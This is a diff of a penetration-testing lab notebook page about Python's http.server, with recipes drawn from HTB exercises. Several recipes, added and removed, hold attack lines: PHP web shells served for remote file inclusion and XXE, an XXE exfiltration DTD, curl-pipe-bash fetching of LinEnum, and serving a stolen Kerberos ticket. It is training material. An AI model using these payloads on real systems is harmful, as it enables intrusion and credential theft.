@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/http-server.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Serve a dedicated folder over a chosen interface
+[Search this tool’s saved examples](/commands/notebook?tool=http-server) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Serve a dedicated folder over a chosen interface
 
 **Run in:** Kali. **Requires:** Python 3, a prepared transfer directory and an address assigned to Kali that the target can reach.
 
@@ -21,149 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 python3 -m http.server 8000 --bind KALI_IP --directory ./transfer
 ```
 
-**Read the result:** The server log proves an HTTP request reached this listener; confirm the returned file separately.
-
-**If The process runs but no client request appears:** The current directory is what gets served. Binding an interface and choosing a reachable callback address are distinct decisions.
+**What the result establishes:** The server log proves an HTTP request reached this listener; confirm the returned file separately.
 
 **Next check:** Check listener address, port, route and firewall, then request a known filename; this server does not implement file uploads.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://docs.python.org/3/library/http.server.html)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## python3 http.server: choose the operation and read the result
-
-Serve the current directory over HTTP.
-
-### What the result establishes
-
-The server log proves an HTTP request reached this listener; confirm the returned file separately.
-
-### Prerequisites and common failures
-
-The current directory is what gets served. Binding an interface and choosing a reachable callback address are distinct decisions.
-
-### Example 1: Commands
-
-Run in: **Kali**. Run from the folder containing the files to share.
-
-```bash
-python3 -m http.server 8000
-```
-
-### Example 2: Quick Web Servers (Serve Files from Target)
-
-Run in: **Saved lab example**.
-
-```bash
-python3 -m http.server                    # port 8000 default
-python2.7 -m SimpleHTTPServer             # Python 2 version
-php -S 0.0.0.0:8000                       # PHP built-in server
-ruby -run -ehttpd . -p8000                # Ruby built-in server
-```
-
-Saved context: [File Transfers for Linux and Windows — Quick Web Servers (Serve Files from Target)](/post-exploitation/file-transfers-cheat-sheet#quick-web-servers-serve-files-from-target). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Quick Decision Tree
-
-Run in: **Saved lab example**.
-
-```text
-DOWNLOADING TO WINDOWS:
-├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
-├── Only cmd.exe?       → certutil or bitsadmin
-├── Internal network?   → SMB (impacket-smbserver)
-├── Need fileless?      → IEX + DownloadString
-└── Nothing works?      → Base64 encode/decode via clipboard
-
-DOWNLOADING TO LINUX:
-├── Have curl/wget?     → Use them (simplest)
-├── Need fileless?      → curl | bash  or  wget -qO- | python3
-├── Have Python/PHP?    → Use language one-liners
-├── Nothing available?  → /dev/tcp bash trick
-└── Need encryption?    → OpenSSL s_server/s_client
-
-UPLOADING FROM WINDOWS:
-├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
-├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
-├── Internal network?   → SMB or WebDAV
-└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
-
-UPLOADING FROM LINUX:
-├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
-├── Have SCP?           → scp file user@attacker:/path/
-├── Have Python?        → python3 requests.post one-liner
-└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
-```
-
-Saved context: [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 4: Phase 1 — Confirming Arbitrary File Write via CoreFTP's HTTP(S) Service
-
-Run in: **Saved lab example**.
-
-```text
-Server: Core FTP HTTP Server
-Content-type: application/octet-stream
-```
-
-Saved context: [Common Services: Personal Assessment Notes — Phase 1 — Confirming Arbitrary File Write via CoreFTP's HTTP(S) Service](/modules/common-services/assessment#phase-1-—-confirming-arbitrary-file-write-via-coreftps-https-service). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 5: Enumeration (post-foothold)
-
-Run in: **Saved lab example**.
-
-```bash
-# Attacker
-python3 -m http.server 8080
-
-# Target
-wget http://10.10.14.174:8080/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
-```
-
-Saved context: [HTB Nibbles: Walkthrough and Report — Enumeration (post-foothold)](/cheatsheets/nibbles#enumeration-post-foothold). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 6: Step 5 — Transfer the ticket from LINUX01 to Kali
-
-Run in: **Saved lab example**.
-
-```bash
-# [ON LINUX01, as root] copy to a clean dir and serve it
-mkdir /tmp/x && cp /tmp/krb5cc_647401106_8Dt6uj /tmp/x/ && cd /tmp/x
-python3 -m http.server 8080
-```
-
-Saved context: [Pass the Ticket from Linux — Step 5 — Transfer the ticket from LINUX01 to Kali](/password-attacks/pass-the-ticket-from-linux#step-5-—-transfer-the-ticket-from-linux01-to-kali). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 7: LFI → RCE
-
-Run in: **Saved lab example**.
-
-```bash
-# RFI (allow_url_include=On): host a payload and include it
-echo '<?php system($_GET[0]); ?>' > sh.php ; python3 -m http.server 80
-http://$IP/?page=http://ATTACKER/sh.php&0=id
-```
-
-Saved context: [LFI / RFI — LFI → RCE](/web/lfi-rfi#lfi-→-rce). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Serve the current directory over HTTP.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=http-server) · [All tools](/index)
 
 ## Commands
 
@@ -175,29 +43,68 @@ python3 -m http.server 8000
 
 Run from the folder containing the files to share.
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| The process runs but no client request appears | The current directory is what gets served. Binding an interface and choosing a reachable callback address are distinct decisions. |
 
 ## Notebook recipes
 
-10 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+16 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
-<Accordion title="LFI → RCE">
+<Accordion title="Callback with a fixed marker">
 
-### LFI → RCE
+### Callback with a fixed marker
 
-**File Inclusion: LFI and RFI Quick Reference**
+**Command Injection**
 
 ```bash
-# RFI (allow_url_include=On): host a payload and include it
-echo '<?php system($_GET[0]); ?>' > sh.php ; python3 -m http.server 80
-http://$IP/?page=http://ATTACKER/sh.php&0=id
+# On your workstation, in a directory containing no unrelated files:
+python3 -m http.server 8000 --bind 0.0.0.0
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [LFI / RFI — LFI → RCE](/web/lfi-rfi#lfi-→-rce)
+**Original note sections:** [Command Injection — Callback with a fixed marker](/web/cmdi#callback-with-a-fixed-marker)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="HTTP">
+
+### HTTP
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
+Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — HTTP](/web/htb/file-inclusion#http)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
+Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
+
+SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — HTTP](/web/htb/file-inclusion#http)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -240,7 +147,7 @@ UPLOADING FROM LINUX:
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 6: Quick Decision Tree](/enumeration/citrix-netscaler#example-6-quick-decision-tree) · [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
+**Original note sections:** [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -322,6 +229,70 @@ python3 -m http.server 80            # quick web server to transfer files
 
 </Accordion>
 
+<Accordion title="LFI → RCE">
+
+### LFI → RCE
+
+**LFI / RFI**
+
+```bash
+# RFI (allow_url_include=On): host a payload and include it
+echo '<?php system($_GET[0]); ?>' > sh.php ; python3 -m http.server 80
+http://$IP/?page=http://ATTACKER/sh.php&0=id
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LFI / RFI — LFI → RCE](/web/lfi-rfi#lfi-→-rce)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Remote inclusion">
+
+### Remote inclusion
+
+**LFI / RFI**
+
+```bash
+printf '%s' '<?php echo "rfi-proof"; ?>' > proof.php
+python3 -m http.server 8000 --bind 0.0.0.0
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LFI / RFI — Remote inclusion](/web/lfi-rfi#remote-inclusion)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Automated Linux local enumeration script">
+
+### Automated Linux local enumeration script
+
+**LinEnum: Script Bookmark**
+
+```bash
+# On Kali: host LinEnum.sh
+python3 -m http.server 8000
+
+# On target: run in memory or from /tmp and save output
+curl -s http://LHOST:8000/LinEnum.sh | bash -s -- -t > /tmp/linenum.txt
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LinEnum: Script Bookmark — Automated Linux local enumeration script](/enumeration/linenum#automated-linux-local-enumeration-script)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="Step 5 — Transfer the ticket from LINUX01 to Kali">
 
 ### Step 5 — Transfer the ticket from LINUX01 to Kali
@@ -332,21 +303,6 @@ python3 -m http.server 80            # quick web server to transfer files
 # [ON LINUX01, as root] copy to a clean dir and serve it
 mkdir /tmp/x && cp /tmp/krb5cc_647401106_8Dt6uj /tmp/x/ && cd /tmp/x
 python3 -m http.server 8080
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pass the Ticket from Linux — Step 5 — Transfer the ticket from LINUX01 to Kali](/password-attacks/pass-the-ticket-from-linux#step-5-—-transfer-the-ticket-from-linux01-to-kali)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Pass the Ticket from Linux**
-
-Context from the notebook: Port mismatch:  the  python3 -m http.server &lt;port>  and the  wget `http://...:<port>`  must use the  same  port.
-
-```text
-python3 -m http.server <port>
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
@@ -401,42 +357,82 @@ python3 -m http.server <port>
 
 </Accordion>
 
-<Accordion title="The essential toolset">
+<Accordion title="Baseline and a uniquely identifiable request">
 
-### The essential toolset
+### Baseline and a uniquely identifiable request
 
-**Getting Started with Penetration Testing**
+**SSRF (Server-Side Request Forgery)**
 
-Context from the notebook: Catch shells / transfer nc ,  python3 -m http.server  →  File Transfers Cheat Sheet
-
-```text
-python3 -m http.server
+```bash
+python3 -m http.server 8000 --bind 0.0.0.0
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Getting Started with Penetration Testing — The essential toolset](/getting-started/getting-started-cheat-sheet#the-essential-toolset) · [Pass the Ticket from Linux — Troubleshooting quick reference](/password-attacks/pass-the-ticket-from-linux#troubleshooting-quick-reference) · [File Transfers for Linux and Windows — Why this matters & how to choose a method](/post-exploitation/file-transfers-cheat-sheet#why-this-matters-&-how-to-choose-a-method)
+**Original note sections:** [SSRF (Server-Side Request Forgery) — Baseline and a uniquely identifiable request](/web/ssrf#baseline-and-a-uniquely-identifiable-request) · [XSS (Cross-Site Scripting) — Blind proof without collecting sensitive values](/web/xss#blind-proof-without-collecting-sensitive-values)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="Technical walkthrough">
+<Accordion title="Advanced Exfiltration with CDATA">
 
-### Technical walkthrough
+### Advanced Exfiltration with CDATA
 
-**HTB Nibbles: Walkthrough and Report**
-
-Context from the notebook: Post-exploitation enumeration with  sudo -l  (cross-checked by  linpeas.sh , staged over an ad-hoc  python3 -m http.server 8080 ) revealed  nibbler  could run  /home/nibbler/personal/stuff/monitor.sh  as root without a password. After unzipping  personal.zip , the script was found to be writable by  nibbler . A reverse-shell payload was appended with  tee -a monitor.sh , a second listener opened on TCP/8443, and  sudo /home/nibbler/personal/stuff/monitor.sh  was executed — granting a root shell and  root.txt .
+**Web Attacks — HTB Module**
 
 ```text
-python3 -m http.server 8080
+grcic550@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+grcic550@htb[/htb]$ python3 -m http.server 8000
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [HTB Nibbles: Walkthrough and Report — Technical walkthrough](/cheatsheets/nibbles#technical-walkthrough)
+**Original note sections:** [Web Attacks — HTB Module — Advanced Exfiltration with CDATA](/web/htb/web-attacks#advanced-exfiltration-with-cdata)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Remote Code Execution with XXE">
+
+### Remote Code Execution with XXE
+
+**Web Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+grcic550@htb[/htb]$ sudo python3 -m http.server 80
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Remote Code Execution with XXE](/web/htb/web-attacks#remote-code-execution-with-xxe)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="CDATA: separate the two files">
+
+### CDATA: separate the two files
+
+**XXE: XML External Entity Injection**
+
+```bash
+mkdir -p dtd
+printf '%s\n' '<!ENTITY joined "%begin;%file;%end;">' > dtd/cdata.dtd
+python3 -m http.server 8000 --bind 0.0.0.0 --directory dtd
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [XXE: XML External Entity Injection — CDATA: separate the two files](/web/xxe#cdata-separate-the-two-files)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -445,6 +441,10 @@ python3 -m http.server 8080
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://docs.python.org/3/library/http.server.html)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -452,5 +452,3 @@ python3 -m http.server 8080
 - [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
